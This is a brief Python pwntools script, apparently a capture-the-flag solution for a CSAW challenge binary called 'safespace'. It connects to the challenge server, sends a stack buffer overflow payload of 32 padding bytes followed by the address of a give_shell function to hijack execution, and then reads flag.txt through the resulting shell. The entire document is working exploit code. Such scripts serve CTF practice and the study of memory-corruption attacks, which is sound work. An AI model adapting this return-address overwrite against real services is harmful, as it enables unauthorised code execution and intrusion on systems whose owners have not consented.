from pwn import *

#r = process("./safespace")
r = remote("pwn.chal.csaw.io", 1002)
elf = context.binary = ELF("./safespace")

GIVE_SHELL = elf.symbols["give_shell"]

r.recvuntil("name?\n\n")

payload = ""
payload += "A" * 32
payload += p64(GIVE_SHELL)
r.sendline(payload)
r.recv()

r.sendline("cat flag.txt")
print(r.recv())
